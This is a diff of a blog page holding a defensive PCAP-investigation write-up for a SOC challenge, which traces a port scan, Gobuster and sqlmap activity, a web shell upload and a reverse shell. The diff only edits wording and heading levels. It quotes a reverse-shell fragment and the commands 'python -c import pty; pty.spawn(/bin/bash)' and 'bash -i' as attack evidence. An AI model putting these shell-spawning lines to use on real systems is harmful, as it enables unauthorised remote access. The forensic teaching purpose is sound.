@@ -13,8 +13,8 @@
   name="description"
   content="Scenario
 The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. Can you investigate and determine if this activity is malicious or not? You have been provided a PCAP, investigate using any tools you wish.
-My usual approach is to move back and forth from general statistics to close up investigation of streams.
-PORT SCANNING # So I would start with Statistics -&amp;gt; Endpoints -&amp;gt; TCP ."
+My usual approach is to move back and forth from general statistics to a close-up investigation of streams.
+PORT SCANNING # So I would start with Statistics -&amp;gt; Endpoints -&amp;gt; TCP."
 />
 <meta
   name="keywords"
@@ -186,12 +186,12 @@ PORT SCANNING # So I would start with Statistics -&amp;gt; Endpoints -&amp;gt; T
 <p>Scenario</p>
 <p>The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. Can you investigate and determine if this activity is malicious or not? You have been provided a PCAP, investigate using any tools you wish.</p>
 </blockquote>
-<p>My usual approach is to move back and forth from general statistics to close up investigation of streams.</p>
-<h3 id="port-scanning">
+<p>My usual approach is to move back and forth from general statistics to a close-up investigation of streams.</p>
+<h4 id="port-scanning">
   PORT SCANNING
   <a href="#port-scanning" class="h-anchor" aria-hidden="true">#</a>
-</h3>
-<p>So I would start with <strong>Statistics</strong> -&gt; <strong>Endpoints</strong> -&gt; <strong>TCP</strong> .  By sorting ports we can instantly identify port incrementation that is indication of the port scanning.</p>
+</h4>
+<p>So I would start with <strong>Statistics</strong> -&gt; <strong>Endpoints</strong> -&gt; <strong>TCP</strong>.  By sorting ports we can instantly identify port incrementation which is an indication of the port scanning.</p>
 <p><img src="https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/64ed0c5d-ed6f-4bb3-ad10-a3d81182d0c5" alt="ports-last"></p>
 <p>The stream reveals that <code>10.251.96.4</code> is the IP responsible for conducting the <code>TCP SYN</code> port scan activity in the port range of <code>1-1024</code></p>
 <p><img src="https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/5c3f9638-fb2e-40e2-af00-aaf537610f87" alt="TCPSYNscan"></p>
@@ -202,15 +202,15 @@ gobuster/3.0.1
 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36
 Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 sqlmap/1.4.7#stable (http://sqlmap.org)
-</code></pre><p>It will reveal the tools used which are <code>Gobuster 3.0.1</code>,
-<img src="https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/c2578128-05ad-4ecb-be9d-5fc636077665" alt="gobuster"></p>
-<p>and   <code>sqlmap 1.4.7</code></p>
+</code></pre><p>It will reveal the tools used which are <code>Gobuster 3.0.1</code></p>
+<p><img src="https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/c2578128-05ad-4ecb-be9d-5fc636077665" alt="gobuster"></p>
+<p>and <code>sqlmap 1.4.7</code></p>
 <p><img src="https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/12fab041-a8b6-46f6-a133-08a75a89bd0b" alt="sql"></p>
 <hr>
-<h3 id="file-upload">
+<h4 id="file-upload">
   FILE UPLOAD
   <a href="#file-upload" class="h-anchor" aria-hidden="true">#</a>
-</h3>
+</h4>
 <p><strong>Export objects</strong> -&gt; <strong>HTTP</strong></p>
 <p><img src="https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/71bdf96f-fb65-420e-af04-7efa4d6273e1" alt="upload"></p>
 <p>The attacker used <code>editprofile.php</code> to upload a web shell <code>dbfunctions.php</code>:</p>
@@ -242,10 +242,10 @@ sqlmap/1.4.7#stable (http://sqlmap.org)
 </ul>
 <pre tabindex="0"><code>p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);
 </code></pre><hr>
-<h3 id="shell-connection">
+<h4 id="shell-connection">
   SHELL CONNECTION
   <a href="#shell-connection" class="h-anchor" aria-hidden="true">#</a>
-</h3>
+</h4>
 <p><img src="https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/52058542-85ec-48c7-b96f-916ca5739572" alt="shell-python"></p>
 <p>Following tcp stream on port 4422, we can confirm that the reverse shell connection is established.</p>
 <p>The attempts to escalate privileges appear to have been made by executing commands such as <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code> and <code>bash -i</code>. These commands are commonly used to attempt to gain a more interactive shell or elevate privileges.</p>
